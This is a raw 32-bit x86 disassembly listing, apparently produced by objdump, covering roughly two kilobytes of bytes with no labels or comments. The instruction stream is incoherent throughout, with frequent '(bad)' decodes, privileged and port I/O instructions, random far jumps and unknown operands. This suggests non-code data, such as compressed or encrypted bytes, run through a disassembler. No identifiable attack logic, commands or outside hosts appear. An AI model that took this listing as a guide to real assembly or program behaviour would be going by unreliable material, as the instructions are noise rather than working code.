  50fcd1:	dec    ecx
  50fcd2:	dec    edx
  50fcd3:	pop    eax
  50fcd4:	nop
  50fcd5:	dec    esp
  50fcd6:	(bad)  
  50fcd7:	pop    ecx
  50fcd8:	mov    ch,0x8
  50fcda:	push   ecx
  50fcdb:	shr    BYTE PTR [ebx-0x58],1
  50fcde:	jle    0x50fcdc
  50fce0:	cmp    al,0x2f
  50fce2:	mov    esp,eax
  50fce4:	pop    ebx
  50fce5:	push   es
  50fce6:	pop    eax
  50fce7:	add    DWORD PTR [esp+ebp*1],0xffffffba
  50fceb:	inc    ecx
  50fcec:	cs push edx
  50fcee:	xor    esi,DWORD PTR [edx]
  50fcf0:	push   ds
  50fcf1:	jns    0x50fcc3
  50fcf3:	jl     0x50fcc3
  50fcf5:	push   ecx
  50fcf6:	pop    eax
  50fcf7:	mov    dh,0x3e
  50fcf9:	xchg   BYTE PTR [esi-0x4a],ch
  50fcfc:	add    BYTE PTR [ebp-0xc],bh
  50fcff:	or     BYTE PTR [edi],cl
  50fd01:	js     0x50fd6b
  50fd03:	mov    esi,DWORD PTR [esi+edi*8+0x7e]
  50fd07:	lds    eax,FWORD PTR [ecx+0x3ee6f1b9]
  50fd0d:	xchg   edx,eax
  50fd0e:	jno    0x50fd5f
  50fd10:	inc    ebx
  50fd11:	sahf   
  50fd12:	dec    ebx
  50fd13:	push   edi
  50fd14:	pop    ebp
  50fd15:	jb     0x50fd90
  50fd17:	push   edx
  50fd18:	sar    ah,0x3
  50fd1b:	into   
  50fd1c:	or     al,0xc9
  50fd1e:	das    
  50fd1f:	sahf   
  50fd20:	xor    esp,0x2e
  50fd23:	xchg   ebx,eax
  50fd24:	(bad)  
  50fd25:	mov    ch,0x6c
  50fd27:	repnz push esp
  50fd29:	mov    WORD PTR [ecx-0x1a],ss
  50fd2c:	ret    
  50fd2d:	bndstx [esi-0x29],(bad)
  50fd31:	or     al,0x6f
  50fd33:	push   ebx
  50fd34:	adc    DWORD PTR [ebx],eax
  50fd36:	daa    
  50fd37:	and    DWORD PTR [esi],esi
  50fd39:	mov    es,WORD PTR [eax-0x60ca197a]
  50fd3f:	cmp    ch,BYTE PTR [edx+0x6c9a434c]
  50fd45:	jmp    0x50fd89
  50fd47:	cmp    eax,0xb5fe1c36
  50fd4c:	push   edx
  50fd4d:	sahf   
  50fd4e:	sti    
  50fd4f:	pop    ds
  50fd50:	sti    
  50fd51:	call   0x63a3:0x48fc49e7
  50fd58:	add    al,BYTE PTR [ecx+ebx*2+0x15]
  50fd5c:	adc    ecx,esp
  50fd5e:	push   ss
  50fd5f:	fidivr WORD PTR [ecx+ecx*1+0x51206804]
  50fd66:	push   ss
  50fd67:	mov    ?,WORD PTR [ebx+0x3fd14d1]
  50fd6d:	shl    DWORD PTR [esi],0x7e
  50fd70:	jae    0x50fd52
  50fd72:	test   al,0x11
  50fd74:	(bad)  
  50fd75:	jl     0x50fda5
  50fd77:	fadd   QWORD PTR [ebx-0xf6c81d3]
  50fd7d:	fcomi  st,st(5)
  50fd7f:	and    bh,BYTE PTR [edi+0x196c3b6b]
  50fd85:	lahf   
  50fd86:	sti    
  50fd87:	xor    BYTE PTR ds:0x3a22d627,al
  50fd8d:	mov    ebp,0x5f20b9ac
  50fd92:	mov    ebp,DWORD PTR [esi-0xa]
  50fd95:	hlt    
  50fd96:	jnp    0x50fde0
  50fd98:	sub    edi,DWORD PTR [edi]
  50fd9a:	pop    es
  50fd9b:	jmp    0x776a:0xdf6d87d8
  50fda2:	jecxz  0x50fd28
  50fda4:	push   cs
  50fda5:	mov    ?,WORD PTR [ecx]
  50fda7:	jmp    0x37bd:0x18d4303d
  50fdae:	stos   BYTE PTR es:[edi],al
  50fdaf:	jmp    0x5446ec62
  50fdb4:	and    bh,dh
  50fdb6:	loope  0x50fdfa
  50fdb8:	jmp    FWORD PTR [esi]
  50fdba:	fsub   st(3),st
  50fdbc:	nop
  50fdbd:	mov    fs,WORD PTR [ecx+edx*1+0x6289a257]
  50fdc4:	js     0x50fd61
  50fdc6:	js     0x50fe35
  50fdc8:	inc    eax
  50fdc9:	(bad)  
  50fdca:	sub    al,0x5f
  50fdcc:	dec    edi
  50fdcd:	push   cs
  50fdce:	or     DWORD PTR [edi+0x72],ecx
  50fdd1:	or     edi,esi
  50fdd3:	adc    BYTE PTR [edi-0x5a],cl
  50fdd6:	into   
  50fdd7:	cli    
  50fdd8:	imul   edi,DWORD PTR [ebp-0x2fcb560a],0x62
  50fddf:	stos   DWORD PTR es:[edi],eax
  50fde0:	stos   BYTE PTR es:[edi],al
  50fde1:	(bad)  
  50fde2:	ins    DWORD PTR es:[edi],dx
  50fde3:	test   eax,0x1ad9573a
  50fde8:	mov    ah,0xc
  50fdea:	jl     0x50fdbf
  50fdec:	fs mov dh,0xae
  50fdef:	cld    
  50fdf0:	dec    esp
  50fdf1:	shl    BYTE PTR [ebp-0x74c3d875],0xf7
  50fdf8:	sub    eax,0xf9b43c60
  50fdfd:	pop    ecx
  50fdfe:	imul   ebp,DWORD PTR [edi+0x4d],0xffffffbb
  50fe02:	popf   
  50fe03:	inc    ch
  50fe05:	xchg   ebx,eax
  50fe06:	mov    bh,0xf1
  50fe08:	mov    al,0xea
  50fe0a:	xor    DWORD PTR [edi-0x72],ecx
  50fe0d:	dec    ebp
  50fe0e:	retf   
  50fe0f:	repnz (bad) 
  50fe11:	lock sbb esi,esi
  50fe14:	fcom   st(5)
  50fe16:	js     0x50fe43
  50fe18:	xchg   BYTE PTR [edi+0x76],dl
  50fe1b:	push   ebx
  50fe1c:	jo     0x50fdb8
  50fe1e:	jl     0x50fda3
  50fe20:	inc    ebp
  50fe21:	stc    
  50fe22:	jmp    0x1bca5ee
  50fe27:	aaa    
  50fe28:	fld    st(1)
  50fe2a:	in     al,0x36
  50fe2c:	xor    al,0xbb
  50fe2e:	mov    ?,WORD PTR [esi+0x4c]
  50fe31:	sti    
  50fe32:	sub    BYTE PTR [ebx+0x39],0xb9
  50fe36:	mov    cl,0xc2
  50fe38:	sbb    DWORD PTR [ebx],0x7d026f7f
  50fe3e:	adc    eax,0x31ad941c
  50fe43:	test   eax,0x479b72c5
  50fe48:	sub    eax,0x7fe5a442
  50fe4d:	fisub  DWORD PTR [esi+eax*2+0x5766b6eb]
  50fe54:	sahf   
  50fe55:	test   BYTE PTR [eax],0x87
  50fe58:	xchg   ecx,eax
  50fe59:	js     0x50fddf
  50fe5b:	sub    eax,0x9fff6c2c
  50fe60:	pusha  
  50fe61:	jo     0x50fe68
  50fe63:	add    BYTE PTR [ecx+0x2e],bl
  50fe66:	int    0x28
  50fe68:	pop    eax
  50fe69:	dec    esi
  50fe6a:	xor    dh,bh
  50fe6c:	dec    ecx
  50fe6d:	out    dx,eax
  50fe6e:	jmp    0x50fe40
  50fe70:	ja     0x50fdf5
  50fe72:	sbb    al,0x3a
  50fe74:	mov    esi,0x305f257c
  50fe79:	push   eax
  50fe7a:	sti    
  50fe7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  50fe7c:	gs pop eax
  50fe7e:	mov    ds:0xe1249caa,al
  50fe83:	sub    esi,DWORD PTR [edi-0x338cb39b]
  50fe89:	mov    esi,0xeb2dc574
  50fe8e:	lods   al,BYTE PTR ds:[esi]
  50fe8f:	mov    DWORD PTR [edi-0x1ba0e188],esp
  50fe95:	inc    ebx
  50fe96:	jmp    0xdafa:0x35fb7ea7
  50fe9d:	xor    DWORD PTR [ecx],edx
  50fe9f:	jecxz  0x50ff04
  50fea1:	iret   
  50fea2:	outs   dx,DWORD PTR ds:[esi]
  50fea3:	push   eax
  50fea4:	mov    eax,0xb5742313
  50fea9:	in     eax,0x4f
  50feab:	inc    esp
  50feac:	sbb    BYTE PTR [edi-0x59],0x2d
  50feb0:	jae    0x50fef4
  50feb2:	hlt    
  50feb3:	xchg   edx,eax
  50feb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  50feb5:	xor    bh,BYTE PTR [ecx]
  50feb7:	hlt    
  50feb8:	mov    WORD PTR [eax+0x37],?
  50febb:	xor    eax,0xed523dba
  50fec0:	mov    ebp,0xd1fd1066
  50fec5:	fistp  DWORD PTR [ebx]
  50fec7:	gs clc 
  50fec9:	or     ebp,DWORD PTR [eax]
  50fecb:	inc    eax
  50fecc:	icebp  
  50fecd:	fild   QWORD PTR [ecx+eax*8-0x4f]
  50fed1:	jle    0x50fe97
  50fed3:	inc    eax
  50fed4:	or     edx,ecx
  50fed6:	jp     0x50fe6e
  50fed8:	cmp    ebp,ebx
  50feda:	mov    DWORD PTR ds:0xdb23a8f4,edi
  50fee0:	ds call 0x1ee2f8e6
  50fee6:	cmc    
  50fee7:	out    dx,eax
  50fee8:	aas    
  50fee9:	ret    
  50feea:	push   ecx
  50feeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  50feec:	imul   edx,DWORD PTR [eax-0x5d],0x95c417f5
  50fef3:	nop
  50fef4:	push   ss
  50fef5:	xchg   edi,eax
  50fef6:	in     al,0x78
  50fef8:	or     bl,BYTE PTR [edi]
  50fefa:	sub    eax,0xcd7b1225
  50feff:	ficom  DWORD PTR [edi]
  50ff01:	stc    
  50ff02:	add    eax,0x2350fc19
  50ff07:	cli    
  50ff08:	int    0x5d
  50ff0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  50ff0b:	adc    BYTE PTR [edx-0x3a6174c],cl
  50ff11:	popa   
  50ff12:	inc    esp
  50ff13:	out    dx,eax
  50ff14:	adc    al,0x90
  50ff16:	jl     0x50fe9d
  50ff18:	out    0x1d,al
  50ff1a:	ret    0xd5ef
  50ff1d:	ins    DWORD PTR es:[edi],dx
  50ff1e:	fcmovu st,st(5)
  50ff20:	mov    bh,0x5c
  50ff22:	jns    0x50ff65
  50ff24:	loopne 0x50ff58
  50ff26:	in     al,dx
  50ff27:	aaa    
  50ff28:	dec    edi
  50ff29:	sub    eax,0x47ab5dc4
  50ff2e:	push   ss
  50ff2f:	aas    
  50ff30:	cwde   
  50ff31:	fsub   st(1),st
  50ff33:	dec    edx
  50ff34:	mov    bh,0x8a
  50ff36:	cmp    DWORD PTR [eax-0x58],edx
  50ff39:	ss loopne 0x50ff7f
  50ff3c:	cwde   
  50ff3d:	mov    ecx,0x9204529
  50ff42:	mov    ah,0x32
  50ff44:	scas   al,BYTE PTR es:[edi]
  50ff45:	mov    ebx,DWORD PTR [ebp+0x6a]
  50ff48:	dec    ebx
  50ff49:	mul    DWORD PTR [ecx+ebx*8+0x7e]
  50ff4d:	pusha  
  50ff4e:	test   ecx,esp
  50ff50:	shr    esi,cl
  50ff52:	les    esi,FWORD PTR [ebp-0x5c5012a]
  50ff58:	pop    esp
  50ff59:	sar    BYTE PTR [eax],cl
  50ff5b:	outs   dx,BYTE PTR ds:[esi]
  50ff5c:	pop    edx
  50ff5d:	imul   ecx,DWORD PTR [edi+0x52],0xffffffe1
  50ff61:	push   esp
  50ff62:	xchg   al,al
  50ff64:	mov    es,WORD PTR [ecx]
  50ff66:	shr    BYTE PTR [ecx+eax*8+0x34f9f78e],1
  50ff6d:	xor    DWORD PTR [esp+esi*4],ecx
  50ff70:	cmp    ecx,DWORD PTR [ebx+0x3]
  50ff73:	xchg   ebp,eax
  50ff74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  50ff75:	std    
  50ff76:	stos   DWORD PTR es:[edi],eax
  50ff77:	stos   DWORD PTR es:[edi],eax
  50ff78:	add    BYTE PTR [esi],bh
  50ff7a:	push   0xf0084e08
  50ff7f:	cmp    eax,0x56b927c3
  50ff84:	sti    
  50ff85:	or     eax,0x8df5bc70
  50ff8a:	pop    ebx
  50ff8b:	(bad)  
  50ff8c:	inc    edx
  50ff8d:	imul   ebx,DWORD PTR [ecx-0x1eb3d3dc],0x8
  50ff94:	in     eax,dx
  50ff95:	mov    ch,bh
  50ff97:	pop    ebx
  50ff98:	fidiv  WORD PTR [edi-0x74e50242]
  50ff9e:	mov    eax,ds:0xc28850c
  50ffa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  50ffa4:	push   0xffffffc7
  50ffa6:	imul   esp,DWORD PTR ds:0x242c5eef,0xc02423c7
  50ffb0:	scas   eax,DWORD PTR es:[edi]
  50ffb1:	enter  0x760b,0x66
  50ffb5:	test   eax,0x8ed7628
  50ffba:	shl    BYTE PTR [edi-0x6d],cl
  50ffbd:	push   0x689156a1
  50ffc2:	xchg   DWORD PTR [edi+0x69],esi
  50ffc5:	repnz sbb ch,ch
  50ffc8:	inc    ebx
  50ffc9:	enter  0x45bd,0xcf
  50ffcd:	xor    BYTE PTR ds:0xd0417be0,0x24
  50ffd4:	or     BYTE PTR [esi],0x43
  50ffd7:	aam    0x9b
  50ffd9:	scas   al,BYTE PTR es:[edi]
  50ffda:	ins    DWORD PTR es:[edi],dx
  50ffdb:	jmp    0x7f2b:0x8a163a38
  50ffe2:	ins    DWORD PTR es:[edi],dx
  50ffe3:	cmp    cl,0x88
  50ffe6:	lods   eax,DWORD PTR ds:[esi]
  50ffe7:	mov    al,0xa9
  50ffe9:	test   edi,0xc1ba0a48
  50ffef:	dec    eax
  50fff0:	and    BYTE PTR [ecx],0xb8
  50fff3:	and    edi,ecx
  50fff5:	mov    ebp,DWORD PTR [ebx-0x20908554]
  50fffb:	clc    
  50fffc:	cmp    DWORD PTR [ebx],ebp
  50fffe:	add    al,0xc1
  510000:	cmp    esi,DWORD PTR [edx+0x15]
  510003:	outs   dx,BYTE PTR ds:[esi]
  510004:	pop    ebx
  510005:	cmp    eax,0xc5fb6851
  51000a:	dec    esp
  51000b:	or     ecx,edx
  51000d:	and    al,0xe6
  51000f:	test   BYTE PTR [esi],cl
  510011:	and    esp,edx
  510013:	xchg   bp,ax
  510015:	out    dx,eax
  510016:	push   es
  510017:	jbe    0x510009
  510019:	pop    esi
  51001a:	leave  
  51001b:	pop    ebx
  51001c:	cmc    
  51001d:	out    dx,eax
  51001e:	push   cs
  51001f:	add    eax,0x99e9749f
  510024:	dec    eax
  510025:	(bad)  
  510026:	push   ecx
  510027:	sbb    DWORD PTR [ebx+0x40],ecx
  51002a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51002b:	mov    ah,0x32
  51002d:	mov    al,ds:0x127723e1
  510032:	and    al,0x1
  510034:	test   eax,0x773385a8
  510039:	sbb    al,0x0
  51003b:	loop   0x5100b9
  51003d:	sub    BYTE PTR [ecx-0x31],dl
  510040:	pop    esi
  510041:	xlat   BYTE PTR ds:[ebx]
  510042:	iret   
  510043:	fwait
  510044:	arpl   WORD PTR [ebx],di
  510046:	adc    DWORD PTR [esi+ebx*4+0xc3bb543],esi
  51004d:	nop
  51004e:	addr16 or eax,0x77e409c3
  510054:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  510055:	imul   eax,DWORD PTR ds:0x5f3fe4dc,0xffffffbe
  51005c:	jg     0x510045
  51005e:	mov    esp,0xcb3021a0
  510063:	inc    ecx
  510064:	push   ebx
  510065:	adc    DWORD PTR [eax-0x4d],edx
  510068:	xor    BYTE PTR [edx-0x68cfec3e],bh
  51006e:	mov    eax,ds:0x9fdca6be
  510073:	into   
  510074:	xor    BYTE PTR [ebx-0x37],bh
  510077:	xor    ebp,DWORD PTR [edx+0x3c56732a]
  51007d:	aad    0xa0
  51007f:	enter  0x764e,0x4a
  510083:	cmp    BYTE PTR [esi],ah
  510085:	test   BYTE PTR [ecx-0x7a],0x2b
  510089:	mov    bh,0x18
  51008b:	cmp    al,0x2f
  51008d:	repz imul edi,edx,0xdfa4b388
  510094:	adc    al,0xa9
  510096:	ss iret 
  510098:	inc    eax
  510099:	dec    ebp
  51009a:	mov    cl,0x82
  51009c:	adc    eax,0x28d24ba2
  5100a1:	dec    eax
  5100a2:	xor    al,0x95
  5100a4:	jb     0x5100cb
  5100a6:	push   0x61
  5100a8:	gs enter 0xe5a0,0xae
  5100ad:	add    BYTE PTR [eax-0x52],bl
  5100b0:	xchg   edi,eax
  5100b1:	shl    BYTE PTR [edi+0x51019432],0x4b
  5100b8:	or     al,al
  5100ba:	adc    al,0x32
  5100bc:	retf   
  5100bd:	es cld 
  5100bf:	pop    ebp
  5100c0:	lahf   
  5100c1:	pop    es
  5100c2:	or     ebx,DWORD PTR [eax-0x78]
  5100c5:	mov    al,0xd8
  5100c7:	(bad)  
  5100c8:	inc    edx
  5100c9:	sbb    ecx,esp
  5100cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5100cc:	inc    ebx
  5100cd:	xor    DWORD PTR [ecx+0x5a],edi
  5100d0:	rcr    BYTE PTR fs:[edi-0x15],1
  5100d4:	adc    BYTE PTR [eax+eax*2],dl
  5100d7:	fsubr  DWORD PTR [ebx+0x7a]
  5100da:	adc    ebp,DWORD PTR [edx]
  5100dc:	and    ebp,DWORD PTR [ebx-0x6bd71a18]
  5100e2:	mov    fs,ebx
  5100e4:	loop   0x5100e5
  5100e6:	mov    al,ds:0xa5059aeb
  5100eb:	mov    al,ds:0x9cab8be1
  5100f0:	mov    WORD PTR [edi],gs
  5100f2:	cmp    ebp,esi
  5100f4:	cli    
  5100f5:	jno    0x5100e0
  5100f7:	daa    
  5100f8:	jp     0x5100e7
  5100fa:	int    0x47
  5100fc:	xchg   edx,eax
  5100fd:	mov    eax,ds:0x1e32006b
  510102:	xor    BYTE PTR [ebx+0x34],al
  510105:	push   esp
  510106:	out    dx,eax
  510107:	lahf   
  510108:	or     esp,esp
  51010a:	xchg   esp,eax
  51010b:	mov    ds:0x7a2bc1e9,eax
  510110:	lahf   
  510111:	les    eax,FWORD PTR [ebx]
  510113:	enter  0xbdc7,0xf9
  510117:	sbb    al,0xd7
  510119:	fs mov dl,0x96
  51011c:	mov    dl,0xc8
  51011e:	stos   BYTE PTR es:[edi],al
  51011f:	sub    DWORD PTR [ecx-0x78],eax
  510122:	int3   
  510123:	imul   DWORD PTR [edi+0x1d928e0]
  510129:	mov    ecx,0x22c9b19c
  51012e:	add    DWORD PTR [edx],0xffffffd6
  510131:	cmp    eax,0x96cd3fa7
  510136:	xchg   BYTE PTR [ebx],ah
  510138:	xchg   BYTE PTR [ebx],dh
  51013a:	adc    al,0x4a
  51013c:	adc    BYTE PTR [ebx],bl
  51013e:	adc    ah,BYTE PTR [edx-0x5140a843]
  510144:	scas   eax,DWORD PTR es:[edi]
  510145:	std    
  510146:	pop    eax
  510147:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  510148:	(bad)  
  51014a:	push   0xffffffab
  51014c:	sub    DWORD PTR [ecx+eiz*1],edi
  51014f:	rol    BYTE PTR [ebp-0x7c],1
  510152:	std    
  510153:	into   
  510154:	rcr    DWORD PTR [edx],cl
  510156:	scas   eax,DWORD PTR es:[edi]
  510157:	hlt    
  510158:	and    al,0xfb
  51015a:	sbb    esp,edx
  51015c:	add    al,0x94
  51015e:	mov    esp,0x2422cf6f
  510163:	pop    ecx
  510164:	pop    es
  510165:	and    al,0x50
  510167:	ins    BYTE PTR es:[edi],dx
  510168:	outs   dx,BYTE PTR ds:[esi]
  510169:	jo     0x510197
  51016b:	ret    0x8ff9
  51016e:	and    eax,DWORD PTR [esi]
  510170:	mov    ebx,0xdb262de6
  510175:	stc    
  510176:	dec    esi
  510177:	pop    esp
  510178:	fmul   QWORD PTR [edi-0x18b77869]
  51017e:	(bad)  
  51017f:	dec    eax
  510180:	(bad)  
  510181:	popa   
  510182:	mov    al,0x87
  510184:	mov    cl,0xbc
  510186:	cld    
  510187:	push   0xffffffaf
  510189:	pop    es
  51018a:	xor    cl,dl
  51018c:	and    eax,0xf14d3f1c
  510191:	dec    edx
  510192:	push   ebp
  510193:	jle    0x5101fd
  510195:	and    edx,edi
  510197:	icebp  
  510198:	ds mov bh,0x73
  51019b:	ds test al,0xe3
  51019e:	pop    edi
  51019f:	mov    ebx,esp
  5101a1:	out    dx,eax
  5101a2:	outs   dx,DWORD PTR ds:[esi]
  5101a3:	mov    esp,0x637366f4
  5101a8:	inc    BYTE PTR [ebp+0x2b62a69a]
  5101ae:	pushf  
  5101af:	cmp    ebx,ecx
  5101b1:	fidivr WORD PTR [edi-0x5013c6f7]
  5101b7:	cmp    edx,DWORD PTR [esi]
  5101b9:	rol    BYTE PTR es:[edi],1
  5101bc:	dec    ebx
  5101bd:	rcr    DWORD PTR [ebx],1
  5101bf:	jne    0x510182
  5101c1:	shl    ch,1
  5101c3:	dec    esp
  5101c4:	sbb    DWORD PTR [ebx-0x69],esp
  5101c7:	or     al,0x8d
  5101c9:	sahf   
  5101ca:	adc    BYTE PTR [ebp+0x0],al
  5101cd:	int    0x84
  5101cf:	sbb    DWORD PTR ds:0xb922b30d,eax
  5101d5:	pop    DWORD PTR [eax-0x4]
  5101d8:	or     al,0xf8
  5101da:	push   ecx
  5101db:	jns    0x51017b
  5101dd:	push   ss
  5101de:	ret    
  5101df:	test   eax,0xfe3c2858
  5101e4:	jg     0x510205
  5101e6:	sub    ch,bh
  5101e8:	nop
  5101e9:	leave  
  5101ea:	inc    ebp
  5101eb:	pop    eax
  5101ec:	xchg   ebp,eax
  5101ed:	(bad)  
  5101ee:	neg    BYTE PTR [eax]
  5101f0:	cli    
  5101f1:	mov    bl,0xf1
  5101f3:	xchg   edx,eax
  5101f4:	and    ebx,esi
  5101f6:	cmp    al,0xd
  5101f8:	push   esi
  5101f9:	push   ebp
  5101fa:	mov    DWORD PTR [esi+eiz*2],edi
  5101fd:	shl    DWORD PTR [eax+0x28],1
  510200:	mov    bl,0x7
  510202:	inc    edi
  510203:	sub    DWORD PTR [edi-0xb210fb2],esp
  510209:	xchg   ebp,eax
  51020a:	lods   al,BYTE PTR ds:[esi]
  51020b:	adc    cl,BYTE PTR [edx+0x7fd02d2c]
  510211:	adc    al,0x7
  510213:	xlat   BYTE PTR ds:[ebx]
  510214:	in     al,dx
  510215:	cmc    
  510216:	push   0x2243fdfe
  51021b:	retf   0x1933
  51021e:	jo     0x510240
  510220:	call   0xfea8:0x7fdf8d4d
  510227:	lock (bad) 
  510229:	test   eax,0x7f1580f4
  51022e:	lds    ecx,FWORD PTR [ebp-0x5eecb6f9]
  510234:	lods   eax,DWORD PTR cs:[esi]
  510236:	out    0xdc,eax
  510238:	cdq    
  510239:	popa   
  51023a:	push   ss
  51023b:	xor    bl,BYTE PTR [edi]
  51023d:	and    ebp,DWORD PTR [edx+0x68]
  510240:	or     DWORD PTR [ecx],ecx
  510242:	xor    al,0xbd
  510244:	sbb    esp,esp
  510246:	dec    ebx
  510247:	repnz ror dl,cl
  51024a:	push   ebp
  51024b:	jmp    0x510279
  51024d:	add    al,0x22
  51024f:	bsf    ebx,DWORD PTR [edi-0x73]
  510253:	imul   ebx,DWORD PTR [ecx+0x1bad6968],0xf200b088
  51025d:	loopne 0x510205
  51025f:	cdq    
  510260:	pop    es
  510261:	inc    ebx
  510262:	sbb    ch,BYTE PTR [esi+esi*4-0x63]
  510266:	and    al,0x5e
  510268:	dec    esp
  510269:	div    BYTE PTR [esi]
  51026b:	enter  0x9295,0x72
  51026f:	mov    ds:0xef87e62,al
  510274:	add    al,0xa4
  510276:	test   eax,0x9101410a
  51027b:	(bad)  
  51027c:	imul   eax,esp,0xecd289c1
  510282:	sahf   
  510283:	test   ecx,esi
  510285:	push   ss
  510286:	sar    BYTE PTR [esi+0xc276202],1
  51028c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51028d:	push   0xffffffd7
  51028f:	or     BYTE PTR [edi+0x72],0xac
  510293:	inc    ebx
  510294:	das    
  510295:	adc    al,0x7
  510297:	(bad)  
  510298:	(bad)  
  510299:	(bad)  
  51029b:	xchg   esp,eax
  51029c:	fmul   DWORD PTR [eax]
  51029e:	hlt    
  51029f:	mov    dh,0xd9
  5102a1:	ins    BYTE PTR es:[edi],dx
  5102a2:	adc    al,0xaa
  5102a4:	dec    esi
  5102a5:	retf   
  5102a6:	push   DWORD PTR [esi+ebp*1-0x2b]
  5102aa:	jne    0x510293
  5102ac:	leave  
  5102ad:	cmp    esi,DWORD PTR [edi]
  5102af:	es jle 0x510276
  5102b2:	adc    eax,0xbad1f366
  5102b7:	push   edi
  5102b8:	out    dx,eax
  5102b9:	int3   
  5102ba:	and    ebp,esp
  5102bc:	sub    esi,ebp
  5102be:	sbb    BYTE PTR [ebx+0x4e7fbd95],0xe9
  5102c5:	lods   al,BYTE PTR ss:[esi]
  5102c7:	call   0x3891364e
  5102cc:	inc    esp
  5102cd:	out    dx,eax
  5102ce:	repz cmp ah,BYTE PTR [ebx+0x1ecb2b6a]
  5102d5:	inc    edi
  5102d6:	ss das 
  5102d8:	bound  eax,QWORD PTR ds:0xbd1072e3
  5102de:	sub    al,0xcd
  5102e0:	mov    bl,0xb1
  5102e2:	push   eax
  5102e3:	adc    al,0xa1
  5102e5:	xor    BYTE PTR [ebx],bh
  5102e7:	sahf   
  5102e8:	sbb    ebp,ebp
  5102ea:	pop    eax
  5102eb:	leave  
  5102ec:	xchg   esi,eax
  5102ed:	popf   
  5102ee:	mov    eax,0x88aa563d
  5102f3:	je     0x510282
  5102f5:	xor    edi,DWORD PTR [ebp+ebp*2+0x8]
  5102f9:	arpl   WORD PTR [ebp+0x17844a4b],bp
  5102ff:	call   0x89df:0x3368d0e0
  510306:	sahf   
  510307:	ret    0xb9d0
  51030a:	enter  0x839,0x6
  51030e:	imul   esp,DWORD PTR [esi],0x40
  510311:	aad    0xb4
  510313:	cmp    al,0x20
  510315:	add    al,0xde
  510317:	mov    bh,0xa4
  510319:	mov    ecx,0x971c0346
  51031e:	out    0xa7,al
  510320:	fs sahf 
  510322:	out    0x25,eax
  510324:	push   edi
  510325:	mov    dh,0x20
  510327:	divps  xmm3,XMMWORD PTR [ebx]
  51032a:	popa   
  51032b:	sbb    edi,ecx
  51032d:	das    
  51032e:	mov    edi,ebx
  510330:	(bad)  
  510331:	imul   ebx,DWORD PTR [ecx-0x45a77bda],0xffffffd8
  510338:	or     ah,BYTE PTR [ecx]
  51033a:	arpl   WORD PTR [ebx+0x1b6a5e21],sp
  510340:	sbb    al,0xfb
  510342:	dec    ecx
  510343:	ds mov ah,0x6e
  510346:	xchg   edx,eax
  510347:	push   ecx
  510348:	mov    edx,0x7b0f9097
  51034d:	pop    edi
  51034e:	rcl    BYTE PTR [ebx+0x48],cl
  510351:	and    cl,bh
  510353:	cmp    esp,edx
  510355:	push   0xe41dac7c
  51035a:	xor    esi,DWORD PTR [ebx+0x2f]
  51035d:	push   ss
  51035e:	call   FWORD PTR [esi]
  510360:	in     eax,dx
  510361:	test   DWORD PTR [ebp-0x18],esi
  510364:	jne    0x510381
  510366:	xchg   edi,eax
  510367:	dec    esi
  510368:	cmp    eax,ebx
  51036a:	dec    ebp
  51036b:	jge    0x510361
  51036d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51036e:	aaa    
  51036f:	loopne 0x5103e1
  510371:	rcl    DWORD PTR [edx-0x78],cl
  510374:	jp     0x51030b
  510376:	mov    esi,esp
  510378:	xchg   esi,eax
  510379:	jae    0x510307
  51037b:	jle    0x510329
  51037d:	mov    eax,0xb016c0be
  510382:	icebp  
  510383:	clc    
  510384:	lea    esi,[edi]
  510386:	inc    ebx
  510387:	add    BYTE PTR [edx-0x22605d99],ch
  51038d:	call   0x48a0:0x31946738
  510394:	sbb    eax,0xf8910574
  510399:	sbb    ebp,DWORD PTR [edx+0x2c75f347]
  51039f:	push   esp
  5103a0:	fsin   
  5103a2:	and    BYTE PTR [ebp+0x7a0a6b87],dl
  5103a8:	out    0x86,eax
  5103aa:	jbe    0x510397
  5103ac:	add    esi,DWORD PTR ds:0x2ea5fcbd
  5103b2:	or     BYTE PTR [ebp+0x3a],dh
  5103b5:	ret    0x94f4
  5103b8:	mov    esi,0x42f83dcc
  5103bd:	dec    ebp
  5103be:	push   ebx
  5103bf:	leave  
  5103c0:	dec    ebp
  5103c1:	mov    al,0x6
  5103c3:	addr16 je 0x5103bd
  5103c6:	add    eax,0x3e42819f
  5103cb:	jne    0x5103a9
  5103cd:	pop    es
  5103ce:	shr    BYTE PTR [edi-0x64],1
  5103d1:	adc    eax,0x8a2a77d
  5103d6:	inc    eax
  5103d7:	ret    0xfb32
  5103da:	shl    BYTE PTR [esi+ebp*1-0x1],1
  5103de:	fidiv  WORD PTR [eax+0x68]
  5103e1:	push   ebp
  5103e2:	adc    al,0x85
  5103e4:	and    al,0xf9
  5103e6:	mov    BYTE PTR [eax-0x642c6434],dh
  5103ec:	sub    al,0x3e
  5103ee:	ja     0x510393
  5103f0:	inc    ecx
  5103f1:	data16 daa 
  5103f3:	add    al,0x88
  5103f5:	pop    ds
  5103f6:	lea    ebx,[ebx-0x4b60e76b]
  5103fc:	sub    DWORD PTR [eax-0x64],esi
  5103ff:	hlt    
  510400:	dec    eax
  510401:	mov    edi,0xe752b94b
  510406:	push   cs
  510407:	out    0x70,eax
  510409:	out    0x84,al
  51040b:	adc    eax,0xeb6e271f
  510410:	pusha  
  510411:	pop    ecx
  510412:	mov    bh,0x19
  510414:	nop
  510415:	(bad)  
  510416:	mov    ah,0x88
  510418:	push   ebx
  510419:	xchg   ebp,eax
  51041a:	xchg   cl,ch
  51041c:	add    eax,0x64cd04be
  510421:	add    ah,BYTE PTR [edx-0x7869a1c1]
  510427:	pop    eax
  510429:	imul   edx,DWORD PTR ds:0xbb1ba53e,0xffffff8e
  510430:	loope  0x510436
  510432:	inc    ebp
  510433:	mov    al,dh
  510435:	mov    eax,0xcc754515
  51043a:	nop
  51043b:	setp   BYTE PTR [ecx+0xa793d09]
  510442:	in     eax,dx
  510443:	xchg   ecx,eax
  510444:	jae    0x510401
  510446:	pop    ss
